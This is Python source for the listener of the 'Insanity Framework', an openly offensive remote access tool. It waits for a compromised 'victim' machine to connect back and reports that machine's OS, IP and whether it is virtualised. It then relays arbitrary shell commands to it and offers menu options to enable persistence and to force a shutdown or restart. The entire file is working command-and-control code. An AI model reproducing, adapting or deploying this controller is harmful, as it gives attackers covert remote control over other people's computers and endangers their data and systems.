#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
# Copyright 2017 Insanity Framework (IF) 
# Written by: * Alisson Moretto - 4w4k3
# https://github.com/4w4k3/Insanity-Framework
# Licensed under the BSD-3-Clause
from socket import *
import os
import sys
from bin.settings import exec_com
from bin.settings import BLUE, RED, WHITE, GREEN, END

if not os.geteuid() == 0:
    sys.exit('Insanity must be run as root')
    
HOST = ''
PORT = int(raw_input('Tʏᴘᴇ ᴛʜᴇ ᴘᴏʀᴛ: '))


def clear():
    os.system('clear')


def heading():

    sys.stdout.write(RED + '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO': 
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :                  ʙʏ: ''' + WHITE + '''ᴀʟɪssᴏɴ ᴍᴏʀᴇᴛᴛᴏ(''' + RED + '''4ᴡ4ᴋ3''' + WHITE + ''')''' + RED +  '''                                         
 -- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ  --                            Version: 0.1                
''' + END)


def pp():
    sys.stdout.write(RED + '''
$u       #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$~
$#      `"$$$$$$$$$$$$$$$$$$$$$$$$$$|   [PROPANE         |$$$$$$$
$i        $$$$$$$$$$$$$$$$$$$$$$$$$$|         [NIGHTMARE |$$$$$$$$
$$        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$.        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#
 $$      $iW$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!
 $$i      $$$$$$$#"" `"""#$$$$$$$$$$$$$$$$$#""""""#$$$$$$$$$$$$$$$W
 #$$W    `$$$#"            "       !$$$$$`           `"#$$$$$$$$$$#
  $$$     ``                 ! !iuW$$$$$                 #$$$$$$$#
  #$$    $u                  $   $$$$$$$                  $$$$$$$~
   "#    #$$i.               #   $$$$$$$.                 `$$$$$$
          $$$$$i.                """#$$$$i.               .$$$$#
          $$$$$$$$!         .   `    $$$$$$$$$i           $$$$$
          `$$$$$  $iWW   .uW`        #$$$$$$$$$W.       .$$$$$$#
            "#$$$$$$$$$$$$#`          $$$$$$$$$$$iWiuuuW$$$$$$$$W
               !#""    ""             `$$$$$$$##$$$$$$$$$$$$$$$$
          i$$$$    .                   !$$$$$$ .$$$$$$$$$$$$$$$#
         $$$$$$$$$$`                    $$$$$$$$$Wi$$$$$$#"#$$`
         #$$$$$$$$$W.                   $$$$$$$$$$$#   ``
          `$$$$##$$$$!       i$u.  $. .i$$$$$$$$$#""''' + WHITE + '''   InSaNiTy FrAmEwOrK''' + RED + '''
             "     `#W       $$$$$$$$$$$$$$$$$$$`      u$#
                            W$$$$$$$$$$$$$$$$$$      $$$$W
                            $$`!$$$##$$$$``$$$$      $$$$!
                           i$" $$$$  $$#"`  """     W$$$$
''' + END)

clear()
heading()


def mess():
    print '[*] Oᴘᴇʀᴀᴛɪᴏɴᴀʟ Sʏsᴛᴇᴍ: ' + data2
    if vm == 'True':
        print '[*] Vɪʀᴛᴜᴀʟ ᴍᴀᴄʜɪɴᴇ: {0}Dᴇᴛᴇᴄᴛᴇᴅ{1}'.format(RED, END) 
    else:
        print '[*] Vɪʀᴛᴜᴀʟ ᴍᴀᴄʜɪɴᴇ: ɴᴏᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ'
    print '[*] Lᴏᴄᴀʟ ɪᴘ: ' + ip
#    print '[*] Rᴇᴍᴏᴛᴇ Hᴏsᴛ: ' + oss
    print '-{0} ᴛʏᴘᴇ ᴀ ʀᴇᴍᴏᴛᴇ sʜᴇʟʟ ᴄᴏᴍᴍᴀɴᴅ{1} - {0}[{1}ᴇx: ɪᴘᴄᴏɴꜰɪɢ{0}]{1}: '.format(BLUE, END)
    print '- {0}ʀᴜɴ ᴀ ɪɴsᴀɴɪᴛʏ ᴍᴏᴅᴜʟᴇ{1} - {0}[{1}ᴠɪᴇᴡ ᴀᴠᴀɪʟᴀʙʟᴇ ᴍᴏᴅᴜʟᴇs ᴏɴ ʜᴇʟᴘ ᴍᴇssᴀɢᴇ{0}]{1}: '.format(BLUE, END)
    print '-{0} ʜᴇʟᴘ {1}- {0}[{1}ᴠɪᴇᴡ ʜᴇʟᴘ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴍᴏᴅᴜʟᴇs{0}]{1}: '.format(BLUE, END)

s = socket(AF_INET, SOCK_STREAM)
print '[!] Wᴀɪᴛɪɴɢ ꜰᴏʀ ᴄᴏɴɴᴇᴄᴛɪᴏɴs '
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
print "[*] Lɪsᴛᴇɴɪɴɢ ᴏɴ: 0.0.0.0:%s" % str(PORT)
s.listen(10)
conn, addr = s.accept()
print '[*] Cᴏɴɴᴇᴄᴛɪᴏɴ: ' + '{0}ESTABLISHED{2}'.format(GREEN, WHITE, END)
data = conn.recv(1024) 
ip = conn.recv(1024)
conn.send('whoami')
data2 = conn.recv(1024)
vm = conn.recv(1024)
#oss = conn.recv(1024)

mess()


def help():
    print '''
- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ -
    
ᴛʏᴘᴇ {0}ɪɴꜰᴏ{1} - {0}[{1}sʜᴏᴡ ɪɴꜰᴏ's ᴀʙᴏᴜᴛ ᴠɪᴄᴛɪᴍ{0}]{1}
ᴛʏᴘᴇ {0}ᴘᴇʀsɪsᴛᴇɴᴄᴇ{1} - {0}[{1}ᴇɴᴀʙʟᴇ ᴘᴇʀsɪsᴛᴇɴᴄᴇ{0}]{1}
ᴛʏᴘᴇ {0}sʜᴜᴛᴅᴏᴡɴ{1} - {0}[{1}ᴛᴜʀɴ ᴏꜰꜰ ʀᴇᴍᴏᴛᴇ ᴘᴄ{0}]{1}
ᴛʏᴘᴇ {0}ʀᴇsᴛᴀʀᴛ{1} - {0}[{1}ᴛᴜʀɴ ᴏꜰꜰ & ᴛᴜʀɴ ᴏɴ ʀᴇᴍᴏᴛᴇ ᴘᴄ{0}]{1}
ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}
ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}
'''.format(BLUE, END)


# start loop
def main():
    try:
        while 1:
     # enter shell command
            header = ('{0}InSaNiTy{1} > {2}'.format(RED, WHITE, END))
            command = raw_input(header)
            if command.upper() == 'QUIT': 
                clear()
                pp()
                conn.close()
            elif command.upper() == 'HELP':
                help()
            elif command.upper() == 'INFO':
                mess()
            elif command.upper() == 'BACK':
                exec_com('insanity.py')
            elif command.upper() == 'PERSISTENCE':
                try:
                    conn.send('persistence')
                    print '[*] Pᴇʀsɪsᴛᴇɴᴄᴇ Mᴏᴅᴜʟᴇ Eɴᴀʙʟᴇᴅ'
                except:
                    print '\n'
                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)
            elif command.upper() == 'SHUTDOWN':
                try:
                    conn.send('shutdown -s -t 00 -f')
                except:
                    print '\n'
                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)    
            elif command.upper() == 'RESTART':
                try:
                    conn.send('shutdown -r -t 00 -f')
                except:
                    print '\n'
                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)    
            else:
                try:
                    if command != '':
                        data = ''
                        conn.send(command)
                        try:
                            s.settimeout(5.0)
                            conn.settimeout(5.0)     
                            data = conn.recv(4096)
                            print data
                            s.settimeout(None)
                            conn.settimeout(None) 
                        except:
                            print '[*] ᴄᴏᴍᴍᴀɴᴅ ᴇxᴇᴄᴜᴛᴇᴅ'
                except:
                    print '\n'
                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)
    except KeyboardInterrupt:
        clear()
        pp()
        conn.close()


if __name__ == '__main__':
    main()
